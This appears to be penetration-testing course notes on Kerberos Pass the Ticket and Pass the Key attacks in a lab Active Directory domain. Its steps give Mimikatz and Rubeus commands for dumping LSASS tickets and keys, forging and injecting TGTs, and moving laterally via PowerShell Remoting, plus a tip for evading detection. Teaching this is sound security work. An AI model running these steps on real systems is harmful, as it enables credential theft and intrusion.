# Pass the Ticket (PtT) from Windows

## Table of Contents

- [The core idea](#the-core-idea)
- [Step 1: Harvesting existing tickets](#step-1-harvesting-existing-tickets)
  - [With Mimikatz](#with-mimikatz)
  - [With Rubeus](#with-rubeus)
- [Step 2: Forging new tickets — Pass the Key / OverPass the Hash](#step-2-forging-new-tickets--pass-the-key--overpass-the-hash)
  - [Step 2a: Extract the user's Kerberos keys](#step-2a-extract-the-users-kerberos-keys)
  - [Step 2b: Convert the key into a ticket](#step-2b-convert-the-key-into-a-ticket)
- [Step 3: Actually using the ticket — Pass the Ticket](#step-3-actually-using-the-ticket--pass-the-ticket)
  - [Rubeus: forge-and-use in one step](#rubeus-forge-and-use-in-one-step)
  - [Rubeus: import an existing .kirbi file](#rubeus-import-an-existing-kirbi-file)
  - [Rubeus: import directly from a Base64 string](#rubeus-import-directly-from-a-base64-string)
  - [Mimikatz: importing a ticket](#mimikatz-importing-a-ticket)
- [Using a stolen ticket for lateral movement via PowerShell Remoting](#using-a-stolen-ticket-for-lateral-movement-via-powershell-remoting)

---

## The core idea

**Pass the Ticket (PtT)** is Kerberos's version of Pass the Hash — instead of reusing a password hash, we reuse a **stolen Kerberos ticket** to move laterally across an Active Directory environment.

---

### Kerberos refresher: how tickets actually work

Kerberos is built around a simple philosophy: **don't hand your password to every service you touch.** Instead, you get issued tickets, and you present the appropriate ticket to each service — never your actual credentials.

Two ticket types matter here:

| Ticket | Purpose |
|--------|------------|
| **TGT** (Ticket Granting Ticket) | The *first* ticket you get. Doesn't grant access to any specific resource — instead, it lets you request additional tickets without re-entering your password |
| **TGS** (Ticket Granting Service ticket) | A ticket for one *specific* service, requested using your TGT |

### How the exchange works, step by step

1. You authenticate to the Domain Controller by encrypting the current timestamp with your password hash.
2. The DC already knows your password hash, so it can decrypt that timestamp and confirm it's really you.
3. It issues you a **TGT**.
4. From then on, whenever you need to reach a service (say, an MSSQL database), you present your TGT to the Key Distribution Center (KDC) and request a **TGS** specifically for that service.
5. You hand that TGS to the actual service, which trusts it was issued by the KDC and grants access — no password involved at any point after step 1.

This matters for our attack because **both ticket types can be stolen and reused** — a TGS gets you into one specific resource, while a TGT lets you request tickets for *anything* the original user had access to.

---

## The scenario for this guide

Assume we've phished a user, landed on their machine, and managed to escalate to **local administrator**. From here, we'll look at several ways to harvest and reuse Kerberos tickets.

---

## Step 1: Harvesting existing tickets

Windows keeps Kerberos tickets cached inside **LSASS** memory — the same process targeted for NTLM hashes earlier in this module. As a regular user you can only see your *own* tickets; as local admin, you can pull **everyone's**.

### With Mimikatz

```cmd
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # exit
Bye!

c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-evilcorp.evil.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.evilcorp.evil.kirbi
```

This dumps every cached ticket to individual `.kirbi` files:

```
[0;6c680]-2-0-40e10000-plaintext@krbtgt-evilcorp.evil.kirbi
[0;3e7]-0-2-40a50000-DC01$@cifs-DC01.evilcorp.evil.kirbi
```

**Reading the filenames:** a `$` at the end of an account name means it's a **computer account** (needed for the machine itself to talk to AD). A ticket whose service is `krbtgt` is a **TGT** for that account — the most valuable kind, since it can be used to request tickets for anything that user has access to.

> **Known quirk:** on some Windows 10 builds, a Mimikatz bug can cause exported tickets from this method to use the wrong encryption and not work correctly. If you run into that, Rubeus (below) is a reliable fallback.

### With Rubeus

```cmd
c:\tools> Rubeus.exe dump /nowrap
```

Instead of writing files, Rubeus prints each ticket directly to the console in **Base64** format — handy for quickly copy-pasting a ticket elsewhere without needing file transfer. `/nowrap` just keeps the long Base64 string on one line for easier copying.

```
UserName   : plaintext
ServiceName: krbtgt/evilcorp.evil
Base64EncodedTicket: doIE9jCCBPKg...
```

> Both tools require **administrator rights** to dump tickets belonging to other users.

---

## Step 2: Forging new tickets — Pass the Key / OverPass the Hash

Here's where it gets more interesting than plain ticket theft. Instead of stealing an *existing* ticket, we can convert a user's **password hash or Kerberos key** directly into a brand-new, fully valid TGT — effectively "overpassing" the usual password-based request step and jumping straight to Kerberos.

This technique works with any Kerberos key type — `rc4_hmac` (equivalent to an NTLM hash), `aes128_cts_hmac_sha1`, or `aes256_cts_hmac_sha1`.

### Step 2a: Extract the user's Kerberos keys

```cmd
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

```
Username : plaintext
Key List :
  aes256_hmac   b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
  rc4_hmac_nt   3f74aa8f08f712f09cd5177b5c1ce50f
```

This gives multiple key formats for the same underlying password — any of them can be used to request a forged ticket using `Mimikatz` and `Rubeus`.

### Step 2b: Convert the key into a ticket

**With Mimikatz:**
```cmd
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:evilcorp.evil /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This pops a new `cmd.exe`, already carrying a valid Kerberos session as `plaintext` — from here you can request access to any service that user is authorized for.

**With Rubeus:**

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the AES-256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.

```cmd
c:\tools> Rubeus.exe asktgt /domain:evilcorp.evil /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

```
[+] TGT request successful!
Base64(ticket.kirbi): doIE1jCCBNKg...
```

> **Privilege difference worth remembering:** Mimikatz requires **admin rights** to do this; Rubeus does **not**.

> **Detection risk:** modern domains default to **AES** encryption for Kerberos. If you forge a ticket using an **RC4** (NTLM) key instead of AES, it can get flagged as an **"encryption downgrade"** — a known detection signature security teams watch for. Using the **AES** key when available is stealthier.

---

## Step 3: Actually using the ticket — Pass the Ticket

Once you have a valid ticket (stolen or forged), the final step is loading it into your current session so Windows treats you as that user.

### Rubeus: forge-and-use in one step

Add the `/ptt` flag to directly inject the newly forged ticket into your current logon session:

```cmd
c:\tools> Rubeus.exe asktgt /domain:evilcorp.evil /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

```
[+] Ticket successfully imported!
```

### Rubeus: import an existing .kirbi file

```cmd
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-evilcorp.evil.kirbi
```

```
[+] ticket successfully imported!

c:\tools> dir \\DC01.evilcorp.evil\c$
Program Files
Program Files (x86)
```

Access to the Domain Controller's `C$` share confirms the ticket is active and working.

### Rubeus: import directly from a Base64 string

If you only have the Base64-encoded ticket (not a `.kirbi` file), you can pass it directly:

```cmd
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKg...
```

Need to convert a `.kirbi` file into Base64 first? PowerShell can do that:

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

### Mimikatz: importing a ticket

```cmd
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\path\to\ticket.kirbi"

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-evilcorp.evil.kirbi"
```

```
* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-evilcorp.evil.kirbi': OK
mimikatz # exit
Bye!

c:\tools> dir \\DC01.evilcorp.evil\c$

Directory: \\dc01.evilcorp.evil\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---                   11:17 AM                Program Files
d-----                   11:17 AM                Program Files (x86)

<SNIP>
```

> **Convenience tip:** instead of running Mimikatz, exiting, and losing the imported ticket's context, the `misc::cmd` module can spawn a new `cmd.exe` window that *keeps* the imported ticket active — avoiding the extra exit/re-launch step.

---

## Using a stolen ticket for lateral movement via PowerShell Remoting

PowerShell Remoting lets you run commands on a remote machine — the same mechanism admins use for day-to-day remote management. It needs either administrative rights, membership in the **Remote Management Users** group, or explicit remoting permissions — listening by default on TCP **5985** (HTTP) and **5986** (HTTPS).

**Scenario:** you've stolen a ticket for a user who isn't a local admin on the target, but *is* in the Remote Management Users group — enough to get a remote session.

### With Mimikatz

```cmd
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\...\[0;1812a]-2-0-40e10000-john@krbtgt-evilcorp.evil.kirbi"
mimikatz # exit

c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
evilcorp\john
```

The imported ticket carries over into the new PowerShell session, authenticating the remote connection as `john` with zero password prompts.

### With Rubeus — using a "sacrificial" process

Rubeus offers a cleaner approach using `createnetonly`, which spins up a throwaway logon session (technically "Logon type 9") specifically to hold the forged ticket — this avoids disturbing or overwriting the TGT already cached for your *actual* current session.

```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

```
[+] Process : 'cmd.exe' successfully created with LOGON_TYPE = 9
```

This opens a fresh `cmd.exe` window tied to that sacrificial session. From inside *that* window, request and inject the real ticket:

```cmd
C:\tools> Rubeus.exe asktgt /user:john /domain:evilcorp.evil /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

```
[+] Ticket successfully imported!
```

```cmd
c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
evilcorp\john
```

Same end result as the Mimikatz approach, but keeps the forged ticket neatly isolated in its own session rather than mixing it with your original one.

---

## Quick Recap

| Step | Mimikatz | Rubeus |
|------|-------------|-----------|
| Harvest existing tickets | `sekurlsa::tickets /export` (admin required) | `dump /nowrap` (admin required) |
| Forge a ticket from a key (Pass the Key) | `sekurlsa::pth` (admin required) | `asktgt` (no admin needed) |
| Import a ticket (Pass the Ticket) | `kerberos::ptt` | `ptt /ticket:...` |
| Lateral movement via remoting | `kerberos::ptt` + `Enter-PSSession` | `createnetonly` + `asktgt /ptt` + `Enter-PSSession` |

**Key idea:** Pass the Ticket works because Kerberos deliberately avoids re-checking your password after the initial TGT is issued — a valid ticket *is* your identity for as long as it's valid. Whether you steal an existing ticket from LSASS or forge a fresh one from a stolen key (Pass the Key), the end result is the same: full access as that user, no password cracking required at any point.
